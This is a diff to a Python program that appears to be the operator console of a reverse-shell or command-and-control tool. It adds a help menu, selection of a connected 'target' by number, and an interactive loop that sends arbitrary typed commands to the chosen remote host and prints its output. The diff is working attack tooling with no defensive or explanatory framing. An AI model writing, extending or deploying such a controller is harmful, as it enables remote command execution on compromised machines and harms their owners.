@@ -82,7 +82,7 @@ def start_cmp():
     elif "select" in cmd:
         conn = get_target(cmd)
         if conn is not None:
-            send_target_commands(conn)
+            send_commands(conn)
 
     else:
         print("Unknown command, to see all commands enter help command.")
@@ -90,7 +90,9 @@ def start_cmp():
 
 # Display a help message for cmp.
 def cmp_help():
-    pass
+    print(
+        "---COMMANDS---\nhelp: print help message\nlist: list all available connections.\nselect: select and connect to a connection.(Example: select 0)"
+    )
 
 
 # Display all current active connnections with the client.
@@ -116,3 +118,45 @@ def list_connections():
             )
 
         print("---Clients---\n{}".format(results))
+
+
+def get_target(cmd):
+    try:
+        target = int(cmd.lstrip("select "))
+        conn = connections[target]
+        print(
+            "Selected target{}|{}{}".format(
+                target, connections[target][0], connections[target][1]
+            )
+        )
+        return conn
+
+    except:
+        print("Selection not valid.")
+        return None
+
+
+# Send commands to client.
+
+
+def send_commands(conn):
+    init = True
+    while True:
+        try:
+            if init:
+                initial_response = str(conn.recv(1024), "utf-8")
+                print(initial_response, end="")
+                init = False
+
+            cmd = input()
+
+            if cmd == "quit":
+                break
+
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+
+        except:
+            print("Error command could not be sent.")
